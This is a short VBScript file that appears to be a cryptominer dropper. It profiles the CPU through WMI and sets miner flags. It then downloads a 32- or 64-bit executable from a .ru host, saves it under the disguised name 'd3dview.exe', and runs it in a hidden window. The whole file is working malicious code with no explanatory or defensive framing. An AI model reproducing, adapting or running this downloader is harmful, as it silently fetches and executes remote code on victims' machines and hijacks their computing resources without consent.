Option Explicit
Const ForReading = 1
Const ForWriting = 2
Dim ObjWMI, ColSettings, ObjProcessor,cpuminer,videocardminer,WshShell,objStdOut, cpucount
Dim StrComputer, ObjNetwork, objFSO, objWMIService, architectura, proccores, gram,gpu, objItem, lool

Set objStdOut = WScript.StdOut
Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objWMIService = GetObject("winmgmts:\\.\root\cimv2")

Set ObjNetwork = WScript.CreateObject("WScript.Network")
StrComputer = Trim(ObjNetwork.ComputerName)
Set ObjNetwork = Nothing
Set ObjWMI = GetObject("WINMGMTS:" & "{ImpersonationLevel=Impersonate,AuthenticationLevel=Pkt}!\\" & StrComputer & "\Root\CIMV2")
Set ColSettings = ObjWMI.ExecQuery ("SELECT * FROM Win32_Processor")
Set WshShell = WScript.CreateObject("WScript.Shell")
cpuminer = false
architectura = 0
videocardminer = false
For Each ObjProcessor In ColSettings
	If ObjProcessor.ProcessorType = 3 OR ObjProcessor.ProcessorType = 2 Then
		cpuminer = true
		proccores = ObjProcessor.NumberOfLogicalProcessors
		videocardminer = false
	End If
	If ObjProcessor.ProcessorType = 4 OR ObjProcessor.ProcessorType = 6 Then
		cpuminer = false
		videocardminer = true
	End If
	If ObjProcessor.Architecture = 0 AND ObjProcessor.AddressWidth = 32 Then
		architectura=32
	End If
	If (ObjProcessor.Architecture = 6 OR ObjProcessor.Architecture = 9) AND ObjProcessor.DataWidth = 64 AND ObjProcessor.AddressWidth = 32 Then
		architectura=32
	End If
	If (ObjProcessor.Architecture = 6 OR ObjProcessor.Architecture = 9) AND ObjProcessor.DataWidth = 64 AND ObjProcessor.AddressWidth = 64 Then
		architectura=64
	End If
Next
Sub HTTPDownload( myURL, myPath )
    dim xHttp: Set xHttp = createobject("Microsoft.XMLHTTP")
    dim bStrm: Set bStrm = createobject("Adodb.Stream")
    xHttp.Open "GET", myURL, False
    xHttp.Send

    with bStrm
        .type = 1 '//binary
        .open
        .write xHttp.responseBody
        .savetofile myPath, 2 '//overwrite
    end with
End Sub



Set ObjProcessor = Nothing:	Set ColSettings = Nothing:	Set ObjWMI = Nothing:	StrComputer = vbNullstring

If architectura=64 Then 
        HTTPDownload "https://autoshotwf-schokk.ru/daswyhtdawyudawg/64/csrs.exe","./d3dview.exe"
End if

If architectura=32 Then 
        HTTPDownload "https://autoshotwf-schokk.ru/daswyhtdawyudawg/32/csrs.exe","./d3dview.exe"
End if

WshShell.Run "d3dview.exe", 0